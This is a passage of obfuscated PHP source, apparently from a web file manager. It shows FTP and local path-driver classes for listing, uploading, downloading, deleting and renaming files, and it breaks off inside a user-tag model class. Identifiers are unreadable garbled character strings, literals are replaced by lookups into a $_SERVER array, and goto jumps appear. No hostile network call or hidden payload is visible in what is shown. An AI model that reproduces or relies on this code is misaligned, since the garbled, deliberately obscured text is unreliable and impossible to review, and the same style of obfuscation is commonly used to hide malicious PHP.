$this->folderInfo($®ßÏ’ŠÎ); } } return !1; } private function fileList($ï¦õ•˜, &$ú¸íÕñ, &$‡ŸĞ»´, $•¨Íçé² = false) { $îà›şŸ× =& $_SERVER[„Ç©ñÎ©]; $ï¦õ•˜ = $this->iconvSystem($ï¦õ•˜); if (!$this->isFolder($ï¦õ•˜)) { return !1; } @ftp_chdir($this->connect, $îà›şŸ×[8]); $ï¦õ•˜ = rtrim($ï¦õ•˜, $îà›şŸ×[8]) . $îà›şŸ×[8]; check_abort(); $—Î‹úÎ = @ftp_rawlist($this->connect, $ï¦õ•˜); if (!$—Î‹úÎ) { $—Î‹úÎ = array(); } $¨ş’»Ö = array($îà›şŸ×[10] => 1, $îà›şŸ×[1373] => 1); foreach ($—Î‹úÎ as $ÅìƒÔçÂ) { $ŞÖ†øÒ = $this->_listItem($ÅìƒÔçÂ); if ($ŞÖ†øÒ[0] == $îà›şŸ×[762]) { continue; } $´Û‚—¥ˆ = $ŞÖ†øÒ[8]; if (empty($´Û‚—¥ˆ) && $´Û‚—¥ˆ !== $îà›şŸ×[207] || isset($¨ş’»Ö[$´Û‚—¥ˆ])) { continue; } $´Û‚—¥ˆ = $this->iconvApp($ï¦õ•˜ . ltrim($´Û‚—¥ˆ, $îà›şŸ×[8])); $ĞõûşÑµ = array($îà›şŸ×[32] => $´Û‚—¥ˆ, $îà›şŸ×[33] => $îà›şŸ×[209], $îà›şŸ×[86] => $ŞÖ†øÒ[4]); if (substr($ÅìƒÔçÂ, 0, 1) == $îà›şŸ×[1374]) { $ĞõûşÑµ[$îà›şŸ×[33]] = $îà›şŸ×[85]; $ĞõûşÑµ[$îà›şŸ×[86]] = 0; } $Úü“Úáµ = $ĞõûşÑµ[$îà›şŸ×[33]] == $îà›şŸ×[85] ? !0 : !1; $this->cacheMethodInfoSet($´Û‚—¥ˆ, $Úü“Úáµ, $ĞõûşÑµ); if ($Úü“Úáµ) { $ú¸íÕñ[] = $´Û‚—¥ˆ; if ($•¨Íçé²) { $this->fileList($´Û‚—¥ˆ, $ú¸íÕñ, $‡ŸĞ»´, $•¨Íçé²); } continue; } $‡ŸĞ»´[] = $ĞõûşÑµ; } $this->cacheMethodInfoSet($ï¦õ•˜, !0); } private function _listItem($İ¬®¥ğ¥) { if (empty($İ¬®¥ğ¥)) { return array(); } $éø¶¸Î‘ = preg_split($_SERVER[„Ç©ñÎ©][1375], $İ¬®¥ğ¥); if (count($éø¶¸Î‘) <= 9) { return $éø¶¸Î‘; } $éø¶¸Î‘[8] = trim(substr($İ¬®¥ğ¥, strpos($İ¬®¥ğ¥, $éø¶¸Î‘[7]) + strlen($éø¶¸Î‘[7]))); return array_splice($éø¶¸Î‘, 0, 9); } public function listPath($ô««§Ğ©, $Œ”êÏò¥ = false) { $Ìœ·Ä´î =& $_SERVER[„Ç©ñÎ©]; if (!$this->_isconn()) { return !1; } $÷ˆ²Ô²š = $•µÏ–ô = array(); $this->fileList($ô««§Ğ©, $÷ˆ²Ô²š, $•µÏ–ô); foreach ($÷ˆ²Ô²š as $š‰ÑÌ­— => $»Î¯œƒƒ) { $÷ˆ²Ô²š[$š‰ÑÌ­—] = $this->folderInfo($»Î¯œƒƒ, $Œ”êÏò¥); } foreach ($•µÏ–ô as $š‰ÑÌ­— => $»Î¯œƒƒ) { $•µÏ–ô[$š‰ÑÌ­—] = $this->fileInfo($»Î¯œƒƒ[$Ìœ·Ä´î[32]], $Œ”êÏò¥, $»Î¯œƒƒ); } return array($Ìœ·Ä´î[92] => $÷ˆ²Ô²š, $Ìœ·Ä´î[93] => $•µÏ–ô); } public function has($Ìˆ—™°º, $óŒ¹Ç«° = false, $óó‰ó = true) { $Ã»‡×À =& $_SERVER[„Ç©ñÎ©]; $»†»ºŠÒ = $¿û•Ëá® = array(); $óëäÚä‘ = $óŒ¹Ç«° ? !0 : !1; $this->fileList($Ìˆ—™°º, $»†»ºŠÒ, $¿û•Ëá®, $óëäÚä‘); if ($óŒ¹Ç«°) { return array($Ã»‡×À[217] => count($¿û•Ëá®), $Ã»‡×À[218] => count($»†»ºŠÒ)); } if ($óó‰ó) { if (count($¿û•Ëá®)) { return !0; } } else { if (count($»†»ºŠÒ)) { return !0; } } return !1; } public function listAll($é¾ñ¸íõ) { $ÃøÔÂÜù =& $_SERVER[„Ç©ñÎ©]; if (!$this->_isconn()) { return !1; } $€ÄÏÂú˜ = $‡Ç‘Ÿœ = array(); $this->fileList($é¾ñ¸íõ, $€ÄÏÂú˜, $‡Ç‘Ÿœ, !0); $“È€ = array(); foreach ($‡Ç‘Ÿœ as $—’‹ƒá¢) { $“È€[$—’‹ƒá¢[$ÃøÔÂÜù[32]]] = $—’‹ƒá¢[$ÃøÔÂÜù[86]]; } foreach ($€ÄÏÂú˜ as $—’‹ƒá¢) { if (is_string($—’‹ƒá¢)) { $“È€[$—’‹ƒá¢] = 0; } } return $this->listAllFiles($é¾ñ¸íõ, array_keys($“È€), $“È€); } public function getContent($ã¥ü„Ò§) { if (!$this->_isconn()) { return !1; } $ã¥ü„Ò§ = $this->iconvSystem($ã¥ü„Ò§); return $this->fileSubstr($ã¥ü„Ò§); } public function setContent($‹Â¤ÅÙÍ, $§÷í°â² = '') { if (!$this->_isconn()) { return !1; } $»®æ½† = $this->pathThis($this->iconvSystem($‹Â¤ÅÙÍ)); $ªÇİ¡úÀ = $this->tempFile($»®æ½†); file_put_contents($ªÇİ¡úÀ, $§÷í°â²); $ãèÒáõÀ = $this->upload($‹Â¤ÅÙÍ, $this->iconvApp($ªÇİ¡úÀ)); $this->tempFileRemve($ªÇİ¡úÀ); return $ãèÒáõÀ; } public function fileSubstr($›¾®ú¥¹, $ª«›¸éü = 0, $Óë¥í = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($›¾®ú¥¹, $ª«›¸éü, $Óë¥í); } private function ftpRequest($ôâ‹³°É, $ÜŒâÖé• = 0, $çÆÊ¸Ïó = false) { $ôâ‹³°É = $this->iconvSystem($ôâ‹³°É); $¡‡ò²ƒã = $this->scheme . $this->host . $_SERVER[„Ç©ñÎ©][4] . $this->port; $äŠò´£ = curl_init(); curl_setopt($äŠò´£, CURLOPT_URL, $¡‡ò²ƒã . $this->pathEncode($ôâ‹³°É)); curl_setopt($äŠò´£, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($çÆÊ¸Ïó) { $¦Ä©·§„ = $ÜŒâÖé• + $çÆÊ¸Ïó - 1; curl_setopt($äŠò´£, CURLOPT_RANGE, "{$ÜŒâÖé•}\55{$¦Ä©·§„}"); } curl_setopt($äŠò´£, CURLOPT_RETURNTRANSFER, 1); $„Şü˜ü = curl_exec($äŠò´£); curl_close($äŠò´£); return $„Şü˜ü; } public function upload($ãé«Â¬ş, $œİœ÷©ê, $½ğ“ƒœî = false, $¶ñÏ„” = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ãé«Â¬ş))) { return !1; } $ãé«Â¬ş = $this->iconvSystem($ãé«Â¬ş); $œİœ÷©ê = $this->iconvSystem($œİœ÷©ê); $º®‰ú…‘ = ftp_nb_put($this->connect, $ãé«Â¬ş, $œİœ÷©ê, FTP_BINARY); while ($º®‰ú…‘ == FTP_MOREDATA) { $º®‰ú…‘ = ftp_nb_continue($this->connect); } if ($º®‰ú…‘ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ãé«Â¬ş); } public function download($´â•â”Š, $úºú…İÆ = '') { if (!$this->_isconn()) { return !1; } $â£ßÑÛ° = $this->pathFather($úºú…İÆ); if (!IO::mkdir($â£ßÑÛ°)) { return !1; } $´â•â”Š = $this->iconvSystem($´â•â”Š); $úºú…İÆ = $this->iconvSystem($úºú…İÆ); $¢¸Û… = ftp_nb_get($this->connect, $úºú…İÆ, $´â•â”Š, FTP_BINARY); while ($¢¸Û… == FTP_MOREDATA) { $¢¸Û… = ftp_nb_continue($this->connect); } if ($¢¸Û… != FTP_FINISHED) { return !1; } return $this->iconvApp($úºú…İÆ); } public function exist($ÖŸ™İ´) { return $this->isFile($ÖŸ™İ´) || $this->isFolder($ÖŸ™İ´); } public function isFile($İëğ¹¿) { return !$this->isFolder($İëğ¹¿) && $this->objectMeta($İëğ¹¿); } public function isFolder($ŞĞ±°÷¤) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][175], $ŞĞ±°÷¤); } protected function objectMeta($êä‡çÆê) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][177], $êä‡çÆê); } protected function _objectMeta($¤„ó”½€) { $ÖŒÅ¦¾Â =& $_SERVER[„Ç©ñÎ©]; if ($¤„ó”½€ == $ÖŒÅ¦¾Â[12] || $¤„ó”½€ == $ÖŒÅ¦¾Â[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¤„ó”½€ = $this->iconvSystem($¤„ó”½€); $©Ö¦‚¬ = array($ÖŒÅ¦¾Â[32] => $this->iconvApp($¤„ó”½€), $ÖŒÅ¦¾Â[33] => $ÖŒÅ¦¾Â[209], $ÖŒÅ¦¾Â[86] => 0); @ftp_chdir($this->connect, $ÖŒÅ¦¾Â[8]); $ôïëóË = @ftp_size($this->connect, $¤„ó”½€); if ($ôïëóË != -1) { $©Ö¦‚¬[$ÖŒÅ¦¾Â[86]] = $ôïëóË; } else { $º·¿Ãóö = @ftp_chdir($this->connect, $¤„ó”½€); if (!$º·¿Ãóö) { return !1; } $©Ö¦‚¬[$ÖŒÅ¦¾Â[33]] = $ÖŒÅ¦¾Â[85]; } return $©Ö¦‚¬; } protected function _isFolder($‹„ì–ù) { $ĞöŸ—†© =& $_SERVER[„Ç©ñÎ©]; if ($‹„ì–ù == $ĞöŸ—†©[12] || $‹„ì–ù == $ĞöŸ—†©[8]) { return !0; } $Çé¶¹şÔ = $this->_objectMeta($‹„ì–ù); return isset($Çé¶¹şÔ[$ĞöŸ—†©[33]]) && $Çé¶¹şÔ[$ĞöŸ—†©[33]] == $ĞöŸ—†©[85] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ê´ôæ®Â) { if (substr($Ê´ôæ®Â, 0, 2) == $_SERVER[„Ç©ñÎ©][1366]) { $Ê´ôæ®Â = BASIC_PATH . substr($Ê´ôæ®Â, 2); } return $Ê´ôæ®Â; } public function iconvApp($·Ä¦õ÷Ì) { $ƒ¡Š¸ =& $_SERVER[„Ç©ñÎ©]; global $config; return $this->iconvTo($·Ä¦õ÷Ì, $config[$ƒ¡Š¸[1364]], $config[$ƒ¡Š¸[1363]]); } public function iconvSystem($ˆâ®ã¯) { $˜ÄŞê  =& $_SERVER[„Ç©ñÎ©]; global $config; return $this->iconvTo($ˆâ®ã¯, $config[$˜ÄŞê [1363]], $config[$˜ÄŞê [1364]]); } public function getPathOuter($ÆñäÒû‹) { $Í±¸æ…ğ =& $_SERVER[„Ç©ñÎ©]; $€¡Úİ£’ = $this->iconvApp($this->pathBase); $ÆñäÒû‹ = $this->iconvApp($ÆñäÒû‹); if (substr($€¡Úİ£’, 0, 2) == $Í±¸æ…ğ[1366]) { $€¡Úİ£’ = BASIC_PATH . substr($€¡Úİ£’, 2); } if (substr($ÆñäÒû‹, 0, 2) == $Í±¸æ…ğ[1366]) { $ÆñäÒû‹ = BASIC_PATH . substr($ÆñäÒû‹, 2); } $€¡Úİ£’ = KodIO::clear($€¡Úİ£’); $ÆñäÒû‹ = KodIO::clear($ÆñäÒû‹); $ÆñäÒû‹ = substr($ÆñäÒû‹, strlen($€¡Úİ£’)); if (empty($this->pathDriver)) { return $ÆñäÒû‹; } return $this->pathDriver . $Í±¸æ…ğ[8] . ltrim($ÆñäÒû‹, $Í±¸æ…ğ[8]); } public function mkfile($ÆùÒ‘á£, $ŠÂ©Ú = '', $íËôûï£ = REPEAT_RENAME) { $ÆùÒ‘á£ = $this->iconvSystem($ÆùÒ‘á£); @touch($ÆùÒ‘á£); if ($ŠÂ©Ú) { file_put_contents($ÆùÒ‘á£, $ŠÂ©Ú); } @chmod($ÆùÒ‘á£, $this->pathAuth); return is_file($ÆùÒ‘á£) ? $this->getPathOuter($ÆùÒ‘á£) : !1; } public function mkdir($‰È÷¼, $™Ïşöî = REPEAT_SKIP) { $‰È÷¼ = $this->iconvSystem($‰È÷¼); if (is_dir($‰È÷¼)) { return $this->getPathOuter($‰È÷¼); } @mkdir($‰È÷¼, $this->pathAuth, !0); @chmod($‰È÷¼, $this->pathAuth); return is_dir($‰È÷¼) ? $this->getPathOuter($‰È÷¼) : !1; } public function copyFile($Ë°ü¼ğ¾, $Ş®İôØ) { $this->mkdir($this->pathFather($Ş®İôØ)); $Ë°ü¼ğ¾ = $this->iconvSystem($Ë°ü¼ğ¾); $Ş®İôØ = $this->iconvSystem($Ş®İôØ); $°‰÷ı›ş = copy_64($Ë°ü¼ğ¾, $Ş®İôØ); @chmod($Ş®İôØ, $this->pathAuth); return $°‰÷ı›ş ? $this->getPathOuter($Ş®İôØ) : !1; } public function moveFile($òè¡Ïé, $êÌÁ«ƒÀ) { $this->mkdir($this->pathFather($êÌÁ«ƒÀ)); $òè¡Ïé = $this->iconvSystem($òè¡Ïé); $êÌÁ«ƒÀ = $this->iconvSystem($êÌÁ«ƒÀ); $ŠÈ­ÎÍ = intval(@rename($òè¡Ïé, $êÌÁ«ƒÀ)); if (!$ŠÈ­ÎÍ) { if ($ŠÈ­ÎÍ = intval(@copy_64($òè¡Ïé, $êÌÁ«ƒÀ))) { @unlink($òè¡Ïé); } } @chmod($êÌÁ«ƒÀ, $this->pathAuth); return $ŠÈ­ÎÍ ? $this->getPathOuter($êÌÁ«ƒÀ) : !1; } public function movePath($ùøö‡²Ì, $©ĞŞîÚÉ, $ªıØÜû× = false) { $„´‹½Å‹ =& $_SERVER[„Ç©ñÎ©]; $ùøö‡²Ì = $this->iconvSystem($ùøö‡²Ì); $©ĞŞîÚÉ = $this->iconvSystem($©ĞŞîÚÉ); $áœ›™»¶ = rtrim($©ĞŞîÚÉ, $„´‹½Å‹[8]) . $„´‹½Å‹[8] . ($ªıØÜû× ? $ªıØÜû× : get_path_this($ùøö‡²Ì)); if (file_exists($áœ›™»¶)) { return !1; } $¾ââ¶–› = intval(@rename($ùøö‡²Ì, $áœ›™»¶)); $¾ââ¶–› = file_exists($áœ›™»¶); return $¾ââ¶–› ? $this->getPathOuter($áœ›™»¶) : !1; } public function delFile($Ø‘Û¬Âà) { $Ø‘Û¬Âà = $this->iconvSystem($Ø‘Û¬Âà); if (!@unlink($Ø‘Û¬Âà)) { @chmod($Ø‘Û¬Âà, $this->pathAuth); if (!@unlink($Ø‘Û¬Âà)) { return !1; } } else { return !0; } } public function delFolder($ÇİÄõÇŸ) { $ó“úŒ‚’ =& $_SERVER[„Ç©ñÎ©]; $ÇİÄõÇŸ = $this->iconvSystem($ÇİÄõÇŸ); if (!is_dir($ÇİÄõÇŸ)) { return !0; } if (!($§øÅ‰Ş¿ = opendir($ÇİÄõÇŸ))) { return !1; } while (($¨º¶Ûèé = readdir($§øÅ‰Ş¿)) !== !1) { if ($¨º¶Ûèé == $ó“úŒ‚’[10] || $¨º¶Ûèé == $ó“úŒ‚’[1373]) { continue; } $¿ë °Ä‚ = $ÇİÄõÇŸ . $ó“úŒ‚’[8] . $¨º¶Ûèé; if (is_file($¿ë °Ä‚) || is_link($¿ë °Ä‚)) { if (!unlink($¿ë °Ä‚)) { chmod($¿ë °Ä‚, $this->pathAuth); if (!unlink($¿ë °Ä‚)) { return !1; } } } else { if (is_dir($¿ë °Ä‚)) { chmod($¿ë °Ä‚, $this->pathAuth); $¿ë °Ä‚ = $this->iconvApp($¿ë °Ä‚); if (!$this->delFolder($¿ë °Ä‚)) { return !1; } } } } closedir($§øÅ‰Ş¿); return rmdir($ÇİÄõÇŸ); } public function rename($²á‹¦ƒ‰, $Ûµ£÷Á) { $áÄİ° =& $_SERVER[„Ç©ñÎ©]; $öˆ“ßÒ = $this->fileNameAuto($this->pathFather($²á‹¦ƒ‰), $Ûµ£÷Á); $öˆ“ßÒ = $this->iconvSystem($öˆ“ßÒ); $²á‹¦ƒ‰ = $this->iconvSystem($²á‹¦ƒ‰); $ùËı‡üà = $this->pathFather($²á‹¦ƒ‰); $¤±äœø = rtrim($ùËı‡üà, $áÄİ°[8]) . $áÄİ°[8] . $öˆ“ßÒ; $úõºÊ³æ = @rename($²á‹¦ƒ‰, $¤±äœø); $¤±äœø = $this->iconvApp($¤±äœø); return $úõºÊ³æ ? $this->getPathOuter($¤±äœø) : !1; } public function size($‘ÊŞ´Èõ) { $‘ÊŞ´Èõ = $this->iconvSystem($‘ÊŞ´Èõ); return filesize_64($‘ÊŞ´Èõ); } public function info($ŞÁö™ùò) { $ŞÁö™ùò = $this->iconvSystem($ŞÁö™ùò); if ($this->isFolder($ŞÁö™ùò)) { return $this->folderInfo($ŞÁö™ùò); } else { if ($this->isFile($ŞÁö™ùò)) { return $this->fileInfo($ŞÁö™ùò); } } return !1; } protected function infoChildren($ïË¸ÅŠ, &$Ş†Á¤©Å, $³â‰”ªÜ = true) { $¤ÔÎòö =& $_SERVER[„Ç©ñÎ©]; check_abort_echo(); $ïË¸ÅŠ = rtrim($ïË¸ÅŠ, $¤ÔÎòö[8]) . $¤ÔÎòö[8]; if ($³â‰”ªÜ) { $ïË¸ÅŠ = $this->iconvSystem($ïË¸ÅŠ); } if (!($†Üƒ×ó¬ = @opendir($ïË¸ÅŠ))) { return; } while (($Ÿ‘…‡ = readdir($†Üƒ×ó¬)) !== !1) { if ($Ÿ‘…‡ == $¤ÔÎòö[10] || $Ÿ‘…‡ == $¤ÔÎòö[1373]) { continue; } $£Õ–Äçû = $ïË¸ÅŠ . $Ÿ‘…‡; if (is_file($£Õ–Äçû) || is_link($£Õ–Äçû)) { $Ş†Á¤©Å[$¤ÔÎòö[87]]++; $Ş†Á¤©Å[$¤ÔÎòö[86]] += filesize_64($£Õ–Äçû); } else { if (is_dir($£Õ–Äçû)) { $Ş†Á¤©Å[$¤ÔÎòö[88]]++; $this->infoChildren($£Õ–Äçû, $Ş†Á¤©Å, !1); } } } closedir($†Üƒ×ó¬); } private function folderInfo($ŠàÄ”Õ‹, $÷ì’˜…Ö = false) { $±¬šÀŞÅ =& $_SERVER[„Ç©ñÎ©]; $ŠàÄ”Õ‹ = rtrim($ŠàÄ”Õ‹, $±¬šÀŞÅ[8]) . $±¬šÀŞÅ[8]; $¢£ä›Ÿ = $this->iconvApp($this->pathThis($ŠàÄ”Õ‹)); if ($÷ì’˜…Ö) { return array($±¬šÀŞÅ[32] => $¢£ä›Ÿ, $±¬šÀŞÅ[94] => $this->getPathOuter($ŠàÄ”Õ‹), $±¬šÀŞÅ[33] => $±¬šÀŞÅ[85]); } $á¤¤‘Ó = array($±¬šÀŞÅ[32] => $¢£ä›Ÿ, $±¬šÀŞÅ[94] => $this->getPathOuter($ŠàÄ”Õ‹), $±¬šÀŞÅ[33] => $±¬šÀŞÅ[85], $±¬šÀŞÅ[210] => @filectime($ŠàÄ”Õ‹), $±¬šÀŞÅ[95] => @filemtime($ŠàÄ”Õ‹), $±¬šÀŞÅ[1376] => @fileatime($ŠàÄ”Õ‹), $±¬šÀŞÅ[1377] => is_readable($ŠàÄ”Õ‹), $±¬šÀŞÅ[1378] => is_writable($ŠàÄ”Õ‹), $±¬šÀŞÅ[1379] => get_mode($ŠàÄ”Õ‹)); return $á¤¤‘Ó; } private function fileInfo($¤ûùÑÒ¼, $Ã¶Ûõšå = false) { $÷’êŸíš =& $_SERVER[„Ç©ñÎ©]; $ø£†“Í = $this->iconvApp($this->pathThis($¤ûùÑÒ¼)); if ($Ã¶Ûõšå) { return array($÷’êŸíš[32] => $ø£†“Í, $÷’êŸíš[94] => $this->getPathOuter($¤ûùÑÒ¼), $÷’êŸíš[33] => $÷’êŸíš[209], $÷’êŸíš[86] => $this->size($¤ûùÑÒ¼), $÷’êŸíš[184] => $this->ext($ø£†“Í)); } $ËÇØÜß€ = array($÷’êŸíš[32] => $ø£†“Í, $÷’êŸíš[94] => $this->getPathOuter($¤ûùÑÒ¼), $÷’êŸíš[33] => $÷’êŸíš[209], $÷’êŸíš[210] => @filectime($¤ûùÑÒ¼), $÷’êŸíš[95] => @filemtime($¤ûùÑÒ¼), $÷’êŸíš[1376] => @fileatime($¤ûùÑÒ¼), $÷’êŸíš[86] => $this->size($¤ûùÑÒ¼), $÷’êŸíš[184] => $this->ext($ø£†“Í), $÷’êŸíš[1377] => is_readable($¤ûùÑÒ¼), $÷’êŸíš[1378] => is_writable($¤ûùÑÒ¼), $÷’êŸíš[1379] => get_mode($¤ûùÑÒ¼)); return $ËÇØÜß€; } public function exist($êîÓ’ì±) { $êîÓ’ì± = $this->iconvSystem($êîÓ’ì±); return @file_exists($êîÓ’ì±); } public function isFile($ºïôÜØ¶) { $ºïôÜØ¶ = $this->iconvSystem($ºïôÜØ¶); return @is_file($ºïôÜØ¶); } public function isFolder($‰˜¢²ë) { $‰˜¢²ë = $this->iconvSystem($‰˜¢²ë); return @is_dir($‰˜¢²ë); } public function listPath($’ÇÛìÚ‡, $·›¥†· = false) { $ğõÍüÑ =& $_SERVER[„Ç©ñÎ©]; $’ÇÛìÚ‡ = $this->iconvSystem($’ÇÛìÚ‡); $’ÇÛìÚ‡ = rtrim($’ÇÛìÚ‡, $ğõÍüÑ[8]) . $ğõÍüÑ[8]; $¦›æ¤Ï¾ = array($ğõÍüÑ[92] => array(), $ğõÍüÑ[93] => array()); if (!($¾”×òŠ = @opendir($’ÇÛìÚ‡))) { return $¦›æ¤Ï¾; } while (($ ¶Ç¬¦‡ = readdir($¾”×òŠ)) !== !1) { if ($ ¶Ç¬¦‡ == $ğõÍüÑ[10] || $ ¶Ç¬¦‡ == $ğõÍüÑ[1373]) { continue; } $—ıó„ãê = $’ÇÛìÚ‡ . $ ¶Ç¬¦‡; if (is_file($—ıó„ãê)) { $¦›æ¤Ï¾[$ğõÍüÑ[93]][] = $this->fileInfo($—ıó„ãê, $·›¥†·); } else { $¦›æ¤Ï¾[$ğõÍüÑ[92]][] = $this->folderInfo($—ıó„ãê, $·›¥†·); } } closedir($¾”×òŠ); return $¦›æ¤Ï¾; } public function listAll($®ó–Ô¸İ, &$š›Èõ•Í = array()) { $šî†„ƒâ =& $_SERVER[„Ç©ñÎ©]; $®ó–Ô¸İ = $this->iconvSystem($®ó–Ô¸İ); $®ó–Ô¸İ = rtrim($®ó–Ô¸İ, $šî†„ƒâ[8]) . $šî†„ƒâ[8]; if (!($»»½¼ì = @opendir($®ó–Ô¸İ))) { return $š›Èõ•Í; } while (($ãËÙ½à = readdir($»»½¼ì)) !== !1) { if ($ãËÙ½à == $šî†„ƒâ[10] || $ãËÙ½à == $šî†„ƒâ[1373]) { continue; } $Ì¦„’€ã = $®ó–Ô¸İ . $ãËÙ½à; if (is_dir($Ì¦„’€ã) && !is_link($Ì¦„’€ã)) { $š›Èõ•Í[] = array($šî†„ƒâ[94] => $Ì¦„’€ã . $šî†„ƒâ[8], $šî†„ƒâ[85] => 1, $šî†„ƒâ[95] => @filemtime($Ì¦„’€ã), $šî†„ƒâ[86] => 0); $this->listAll($Ì¦„’€ã, $š›Èõ•Í); } else { $š›Èõ•Í[] = array($šî†„ƒâ[94] => $Ì¦„’€ã, $šî†„ƒâ[85] => 0, $šî†„ƒâ[95] => @filemtime($Ì¦„’€ã), $šî†„ƒâ[86] => $this->size($Ì¦„’€ã)); } } closedir($»»½¼ì); return $š›Èõ•Í; } public function has($Øáü·¼´, $ÏúïÌ– = false, $Ø¿û½º½ = true) { $ƒò¢óÕ =& $_SERVER[„Ç©ñÎ©]; $Øáü·¼´ = $this->iconvSystem($Øáü·¼´); $Øáü·¼´ = rtrim($Øáü·¼´, $ƒò¢óÕ[8]) . $ƒò¢óÕ[8]; if (!($³…´šÉ™ = @opendir($Øáü·¼´))) { return !1; } $Ôã‘úèŸ = 0; $™µí¡¤Â = 0; $ğ‚·‰µ = 0; while (($µœåÇòö = readdir($³…´šÉ™)) !== !1) { if ($µœåÇòö == $ƒò¢óÕ[10] || $µœåÇòö == $ƒò¢óÕ[1373]) { continue; } $”¹–Æ’ä = $Øáü·¼´ . $µœåÇòö; if ($ÏúïÌ–) { $ğ‚·‰µ++; if (@is_file($”¹–Æ’ä)) { $Ôã‘úèŸ++; } else { $™µí¡¤Â++; } if ($ğ‚·‰µ > 10000) { break; } continue; } if ($Ø¿û½º½) { if (@is_file($”¹–Æ’ä)) { return !0; } } else { if (@is_dir($”¹–Æ’ä . $ƒò¢óÕ[8])) { return !0; } } } closedir($³…´šÉ™); if ($ÏúïÌ–) { return array($ƒò¢óÕ[217] => $Ôã‘úèŸ, $ƒò¢óÕ[218] => $™µí¡¤Â); } return !1; } public function hashSimple($ÓÔ¬ïöŠ) { $•ÏóÈ =& $_SERVER[„Ç©ñÎ©]; if (!$ÓÔ¬ïöŠ) { return md5($•ÏóÈ[12]); } $ÓÔ¬ïöŠ = $this->iconvSystem($ÓÔ¬ïöŠ); $àÏûÖÍ» = $this->size($ÓÔ¬ïöŠ); $Î³œê³’ = 200; $•Û¨ê‡¡ = 50; if ($àÏûÖÍ» <= $Î³œê³’ * $•Û¨ê‡¡) { return $this->hashMd5($ÓÔ¬ïöŠ) . $àÏûÖÍ»; } $ö˜§€š = $•ÏóÈ[12]; $ÛŸ±±õ± = intval($àÏûÖÍ» / $•Û¨ê‡¡); $æĞÙ”öå = fopen($ÓÔ¬ïöŠ, $•ÏóÈ[1380]); if (!$æĞÙ”öå) { return $ö˜§€š; } for ($íüõœ†ş = 0; $íüõœ†ş < $•Û¨ê‡¡; $íüõœ†ş++) { fseek_64($æĞÙ”öå, $ÛŸ±±õ± * $íüõœ†ş); $ö˜§€š .= fread($æĞÙ”öå, $Î³œê³’); } fseek_64($æĞÙ”öå, $àÏûÖÍ» - $Î³œê³’); $ö˜§€š .= fread($æĞÙ”öå, $Î³œê³’); fclose($æĞÙ”öå); return md5($ö˜§€š) . $àÏûÖÍ»; } public function getContent($ Ğ´Îæš) { $ Ğ´Îæš = $this->iconvSystem($ Ğ´Îæš); return file_get_contents($ Ğ´Îæš); } public function setContent($¾ôĞ»§¥, $ÅÉÑÀãÌ = '') { $¾ôĞ»§¥ = $this->iconvSystem($¾ôĞ»§¥); $ä‰×´× = @file_put_contents($¾ôĞ»§¥, $ÅÉÑÀãÌ, LOCK_EX); clearstatcache(); @chmod($¾ôĞ»§¥, $this->pathAuth); return $ä‰×´× === !1 ? !1 : !0; } public function fileSubstr($æ…·¸şÖ, $Ø¢¼åñ™ = 0, $›é»¬„õ = false) { $ı£Â‹©¸ =& $_SERVER[„Ç©ñÎ©]; $æ…·¸şÖ = $this->iconvSystem($æ…·¸şÖ); if ($›é»¬„õ === !1) { $›é»¬„õ = $this->size($æ…·¸şÖ); } if ($›é»¬„õ <= 0) { return $ı£Â‹©¸[12]; } $òá“ËŞê = fopen($æ…·¸şÖ, $ı£Â‹©¸[1380]); if (!$òá“ËŞê) { return !1; } fseek_64($òá“ËŞê, $Ø¢¼åñ™); $åªì÷Ï· = fread($òá“ËŞê, $›é»¬„õ); fclose($òá“ËŞê); return $åªì÷Ï·; } public function upload($ÕáÉöÎ¦, $±¸ìÏ™Õ, $¸‡ÖŞÑ = false, $ñå“’˜ = REPEAT_REPLACE) { if ($¸‡ÖŞÑ) { return $this->moveFile($±¸ìÏ™Õ, $ÕáÉöÎ¦); } return $this->copyFile($±¸ìÏ™Õ, $ÕáÉöÎ¦); } public function setModifyTime($Ãèª”¹, $ú¢ Å­Ê = '') { @touch($Ãèª”¹, intval($ú¢ Å­Ê)); } public function download($æÄá±, $Â—¥™—) { return $this->iconvSystem($æÄá±); } } goto b˜Ä÷‹¬À¥; D÷œÌŸµÕ”: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\x66\x61\166"; protected function cacheFunctionAlias($êîÉù¯Ÿ) { $ñ¸Ñú =& $_SERVER[„Ç©ñÎ©]; return array($ñ¸Ñú[1938] => array($ñ¸Ñú[2317] . USER_ID, $ñ¸Ñú[1939])); } protected function listData() { $ÏÚÀù¬ñ =& $_SERVER[„Ç©ñÎ©]; $°‹Ô’¼Ì = array($ÏÚÀù¬ñ[1646] => USER_ID, $ÏÚÀù¬ñ[493] => array($ÏÚÀù¬ñ[1942], 0)); $¸é«¨ŠØ = $ÏÚÀù¬ñ[2318]; $›ò·—Å = $this->field($¸é«¨ŠØ)->where($°‹Ô’¼Ì)->order($ÏÚÀù¬ñ[1945])->select(); return $›ò·—Å ? $›ò·—Å : array(); } protected function addToTag($÷‚Ä¾¿Ê, $Äª×Æ¦š) { $ë„€¯ =& $_SERVER[„Ç©ñÎ©]; if (!Model($ë„€¯[2082])->listData($Äª×Æ¦š)) { return !1; } if (is_numeric($÷‚Ä¾¿Ê)) { $İ×€‘İ = Model($ë„€¯[828])->pathInfo($÷‚Ä¾¿Ê); if (!$İ×€‘İ) { return !1; } } else { $İ×€‘İ = IO::infoSimple($÷‚Ä¾¿Ê); if (!$İ×€‘İ) { return !1; } $§ºº¥Õ = $İ×€‘İ[$ë„€¯[32]]; $à“¥²Û‘ = $İ×€‘İ[$ë„€¯[33]]; if (isset($İ×€‘İ[$ë„€¯[419]])) { $à“¥²Û‘ = $İ×€‘İ[$ë„€¯[419]] == $ë„€¯[98] ? $ë„€¯[85] : $ë„€¯[209]; } } $‚³À“éâ = array($ë„€¯[1646] => USER_ID, $ë„€¯[493] => $Äª×Æ¦š, $ë„€¯[430] => $÷‚Ä¾¿Ê, $ë„€¯[431] => $à“¥²Û‘ ? $à“¥²Û‘ : 